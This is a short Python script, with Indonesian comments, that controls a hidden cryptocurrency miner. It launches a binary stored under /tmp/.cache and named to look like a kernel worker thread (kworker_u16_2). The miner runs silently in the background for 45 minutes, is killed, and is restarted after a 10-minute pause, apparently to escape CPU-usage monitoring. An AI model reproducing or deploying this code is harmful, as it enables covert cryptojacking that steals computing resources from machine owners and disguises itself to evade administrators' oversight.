import os
import time
import sys

# CONFIG
MINER_PATH = "/tmp/.cache/kworker_u16_2"  # Lokasi miner
MINING_TIME = 2700  # 45 menit
REST_TIME = 600  # 10 menit

def kill_miner():
    os.system("pkill -f kworker_u16_2")

def start_miner():
    exit_code = os.system(f"nohup {MINER_PATH} > /dev/null 2>&1 &")
    if exit_code != 0:
        print("❌ Gagal menjalankan miner!", file=sys.stderr)
        sys.stderr.flush()

def main():
    while True:
        start_miner()
        time.sleep(MINING_TIME)

        kill_miner()
        time.sleep(REST_TIME)

if __name__ == "__main__":
    main()
